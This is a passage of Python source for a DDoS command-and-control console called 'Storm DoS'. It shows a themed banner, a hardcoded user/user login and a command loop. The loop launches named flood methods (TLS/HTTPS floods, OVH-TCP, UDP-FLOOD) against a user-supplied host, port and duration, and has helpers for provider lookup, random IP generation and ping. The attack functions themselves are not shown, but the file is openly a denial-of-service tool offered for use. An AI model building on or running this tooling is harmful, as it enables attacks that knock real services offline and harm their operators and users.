    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⠀⠀⡴⠲⡄⠀⠀⠙⣄⠀⠀⠀⡖⡄⡾⢃⣀⠤⠒⠊⢁⣤⣄⠈⢳
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣆⠀⠃⠀⡇⠀⠀⠀⠘⡄⠀⠀⡨⢩⠞⠉⠀⠀⠀⠀⠀⠣⣀⣡⡴⠁
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠒⠊⠀⠀⠀⠀⠀⣷⣠⢋⡴⠁
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⣰⣿⠴⠋⠀⠀⠀𝚂𝚝𝚘𝚛𝚖 𝙳𝚘𝚜 v2.1 | By kriska1337 
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣧⡟⠁⠀⠀⠀⠀⠀⠀⠀ 
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉ ⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    
    ⚡ 'METHODS' - Engage METHODS Overdrive | 'utils' - Utility Grid | 'ports' - Port Matrix | 'exit' - Shutdown ⚡
                                ⚡ 'Help' - Display help menu | 'theme' - Switch themes ⚡
    '''
    print(Colorate.Diagonal(current_theme["gradient"], banner))

def main():
    global config, current_theme
    config = load_config()
    current_theme = THEMES[config["theme"]]
    create_default_servers()
    animation()
    menu()
    while True:
        try:
            cnc = input(Colorate.Horizontal(current_theme["gradient"], "⚡ root@StormC2# ~> ")).upper()
            if cnc in ["METHODS", "LAYER"]:
                METHODS()
            elif cnc in ["CLEAR", "CLS"]:
                menu()
            elif cnc in ["UTILS"]:
                utils()
            elif cnc in ["PORTS", "PORT"]:
                ports()
            elif cnc in ["EXIT", "LOGOUT"]:
                print(Colorate.Horizontal(current_theme["gradient"], "⚡⚡ System shutdown initiated... ⚡⚡"))
                time.sleep(1)
                sys.exit(0)
            elif "STORM-TLS" in cnc or "HTTPS" in cnc or "TLSV1" in cnc:
                try:
                    parts = cnc.split()
                    method = parts[0]
                    host = parts[1]
                    duration = parts[2]
                    launch_attack(method, host, duration)
                except IndexError:
                    print(Colorate.Horizontal(current_theme["gradient"], f'⚡ Usage: {method} URL TIME ⚡'))
            elif "OVH-TCP" in cnc:
                try:
                    parts = cnc.split()
                    method = parts[0]
                    ip = parts[1]
                    port = parts[2]
                    duration = parts[3]
                    launch_attack(method, ip, duration, port)
                except IndexError:
                    print(Colorate.Horizontal(current_theme["gradient"], '⚡ Usage: OVH-TCP IP PORT TIME ⚡'))
            elif "UDP-FLOOD" in cnc:
                try:
                    parts = cnc.split()
                    method = parts[0]
                    ip = parts[1]
                    port = parts[2]
                    duration = parts[3]
                    launch_attack(method, ip, duration, port)
                except IndexError:
                    print(Colorate.Horizontal(current_theme["gradient"], '⚡ Usage: UDP-FLOOD IP PORT TIME ⚡'))
            elif "PROVIDER" in cnc:
                try:
                    host = cnc.split()[1]
                    print(Colorate.Horizontal(current_theme["gradient"], f"⚡⚡ Extracting grid intel for {host}... ⚡⚡"))
                    _, _, info = get_provider_info(host)
                    print(info)
                except IndexError:
                    print(Colorate.Horizontal(current_theme["gradient"], '⚡ Usage: PROVIDER URL ⚡'))
            elif "IPGEN" in cnc:
                ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                print(Colorate.Horizontal(current_theme["gradient"], f'⚡ Generated Grid IP: {ip} ⚡'))
            elif "PING" in cnc:
                try:
                    host = cnc.split()[1]
                    print(Colorate.Horizontal(current_theme["gradient"], f"⚡ Pinging {host}... ⚡"))
                    result = ping_host(host)
                    print(Colorate.Horizontal(current_theme["gradient"], result))
                except IndexError:
                    print(Colorate.Horizontal(current_theme["gradient"], '⚡ Usage: PING URL/IP ⚡'))


            elif "THEME" in cnc:
                try:
                    theme_name = cnc.split()[1].lower()
                    if theme_name in THEMES:
                        config["theme"] = theme_name
                        current_theme = THEMES[theme_name]
                        save_config(config)
                        print(Colorate.Horizontal(current_theme["gradient"], f"⚡ Theme switched to {theme_name} ⚡"))
                        menu()
                    else:
                        print(Colorate.Horizontal(current_theme["error_gradient"], f"⚡ Unknown theme: {theme_name}. Available: {', '.join(THEMES.keys())} ⚡"))
                except IndexError:
                    print(Colorate.Horizontal(current_theme["gradient"], f"⚡ Usage: THEME [name] | Available: {', '.join(THEMES.keys())} ⚡"))
            elif "HELP" in cnc:
                clear()
                print(Colorate.Horizontal(current_theme["gradient"], f''' 
                                      
              ╔═╗╔╦╗╔═╗╦═╗╔╦╗  ╔╦╗╔═╗╔═╗
              ╚═╗ ║ ║ ║╠╦╝║║║   ║║║ ║╚═╗
              ╚═╝ ╩ ╚═╝╩╚═╩ ╩  ═╩╝╚═╝╚═╝⠀
                                      
                 {current_theme["help_msg"]}
            ⚡ METHODS  - Engage METHODS Overdrive
            ⚡ UTILS    - Access Utility Grid
            ⚡ HELP     - Display command core
            ⚡ CLEAR    - Reset interface
            ⚡ EXIT     - Shutdown system
            
            '''))
            else:
                try:
                    cmmnd = cnc.split()[0]
                    print(Colorate.Horizontal(current_theme["error_gradient"], f"⚡ Unknown Signal: {cmmnd} ⚡"))
                except IndexError:
                    pass
        except KeyboardInterrupt:
            print(Colorate.Horizontal(current_theme["gradient"], '⚡ Alert: Ctrl+C Interruption Detected ⚡'))
        except Exception as e:
            print(Colorate.Horizontal(current_theme["error_gradient"], f"⚡⚡ Error: {str(e)} - System stabilized ⚡⚡"))

def login():
    clear()
    banner = '''
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀╔═╗╔╦╗╔═╗╦═╗╔╦╗  ╔╦╗╔═╗╔═╗
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀╚═╗ ║ ║ ║╠╦╝║║║   ║║║ ║╚═╗
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀╚═╝ ╩ ╚═╝╩╚═╩ ╩  ═╩╝╚═╝╚═╝⠀⠀⠀⠀⠀
                                 Aᴜᴛʜᴏʀɪᴢᴀᴛɪᴏɴ   
    '''
    print(Colorate.Diagonal(current_theme["gradient"], banner))
    user = "user"
    passwd = "user"
    username = input(Colorate.Diagonal(current_theme["gradient"], "⚡ Operator ID:  "))
    password = getpass.getpass(prompt=Colorate.Diagonal(current_theme["gradient"], '⚡ Access Key: '))
    if username != user or password != passwd:
        print("")
        print(Colorate.Horizontal(current_theme["error_gradient"], "⚡⚡ ACCESS DENIED - INVALID SIGNAL ⚡⚡"))
        print("")
        sys.exit(1)
    elif username == user and password == passwd:
        time.sleep(1)
        main()

if __name__ == "__main__":
    valid_ssh_servers = []
    valid_ssh_count = 0
    config = load_config()
    current_theme = THEMES[config["theme"]]
    try:
        login()
    except KeyboardInterrupt:
        print("\n" + Colorate.Horizontal(current_theme["gradient"], "⚡⚡ System terminated via Ctrl+C ⚡⚡"))
        sys.exit(0)